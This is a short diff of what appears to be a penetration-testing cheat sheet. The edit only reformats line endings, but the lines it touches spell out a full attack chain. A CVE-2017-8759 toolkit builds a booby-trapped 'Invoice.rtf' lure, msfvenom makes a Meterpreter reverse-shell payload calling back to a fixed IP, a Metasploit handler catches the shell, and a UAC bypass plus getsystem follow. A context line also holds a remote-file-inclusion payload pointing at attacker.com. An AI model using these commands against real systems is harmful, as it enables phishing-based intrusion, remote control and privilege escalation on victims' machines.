@@ -39,18 +39,18 @@ render.php?include=http://attacker.com
 
 # Document Exploit
 ## CVE-2017-8759
-git clone https://github.com/bhdresh/CVE-2017-8759
-cd CVE-2017-8759
-python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.210.100/logo.txt
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.210.100 LPORT=4444 -f exe > /tmp/shell.exe
-msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.210.100; run"
-python cve-2017-8759_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe
-python -m SimpleHTTPServer 8080
+git clone https://github.com/bhdresh/CVE-2017-8759  
+cd CVE-2017-8759  
+python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.210.100/logo.txt  
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.210.100 LPORT=4444 -f exe > /tmp/shell.exe  
+msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.210.100; run"  
+python cve-2017-8759_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe  
+python -m SimpleHTTPServer 8080  
 ## Bypassing UAC
-(Metasploit) use exploit/windows/local/bypassuac
-set SESSION 1
-exploit
-getsystem
+(Metasploit) use exploit/windows/local/bypassuac  
+set SESSION 1  
+exploit  
+getsystem  
 
 # Lateral Movement
 ## normal reconnaissance
